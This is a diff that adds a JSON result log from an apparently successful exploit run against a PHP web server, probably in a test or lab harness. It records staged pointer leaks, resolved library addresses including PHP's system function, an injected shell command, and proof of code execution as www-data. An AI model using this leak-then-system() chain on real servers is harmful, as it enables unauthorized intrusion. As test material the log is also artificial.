@@ -1,0 +1,111 @@
+{
+ "stages": [
+  {
+   "stage": "A1",
+   "rc": 0,
+   "elapsed": 0.11
+  },
+  {
+   "stage": "B1",
+   "i": 0,
+   "bytes": 256,
+   "leak": "err:no pointers"
+  },
+  {
+   "stage": "B1",
+   "i": 1,
+   "bytes": 256,
+   "leak": "err:no pointers"
+  },
+  {
+   "stage": "B1",
+   "i": 2,
+   "bytes": 256,
+   "leak": "err:no pointers"
+  },
+  {
+   "stage": "B1",
+   "i": 3,
+   "bytes": 256,
+   "leak": "err:no pointers"
+  },
+  {
+   "stage": "B1",
+   "i": 4,
+   "bytes": 1685746,
+   "decoded": 819208,
+   "lib": "0x7fa80a09d000",
+   "cands": [
+    [
+     "0x7fa808400000",
+     87
+    ],
+    [
+     "0x7fa807a00000",
+     79
+    ]
+   ],
+   "main": "0x7fa808400000",
+   "leak": "hit",
+   "chosen": true
+  },
+  {
+   "stage": "A2",
+   "i": 0,
+   "bytes": 211
+  },
+  {
+   "stage": "B2",
+   "i": 0,
+   "bytes": 256
+  },
+  {
+   "stage": "B2",
+   "i": 1,
+   "bytes": 256
+  },
+  {
+   "stage": "B2",
+   "i": 2,
+   "bytes": 256
+  },
+  {
+   "stage": "B2",
+   "i": 3,
+   "bytes": 256
+  },
+  {
+   "stage": "B2",
+   "i": 4,
+   "bytes": 256
+  },
+  {
+   "stage": "B2",
+   "i": 5,
+   "bytes": 0
+  }
+ ],
+ "success": true,
+ "marker": "WP713",
+ "a1": {
+  "bytes": 1060211,
+  "sha256": "8e8fc166e6b326d20bb7611d8ef3cee3bd5da46447985312c1492ab0a44d1eb6"
+ },
+ "b1": {
+  "bytes": 33128677,
+  "sha256": "b6c547e0e9a2bb26607df1521de96f4d5c9adf4621c28b7ab491587b21ae40f2"
+ },
+ "S": "0x7fa8084f8398",
+ "zif_system": "0x7fa80a502370",
+ "main": "0x7fa808400000",
+ "lib": "0x7fa80a09d000",
+ "a2": {
+  "bytes": 279369
+ },
+ "b2": {
+  "bytes": 451384,
+  "cmd": "id>/out/p1_conc_WP713;echo WP713>>/out/p1_conc_WP713;id>&2;echo WP713>&2"
+ },
+ "proof": "uid=33(www-data) gid=33(www-data) groups=33(www-data)\nWP713\n",
+ "b2_hit": 5
+}
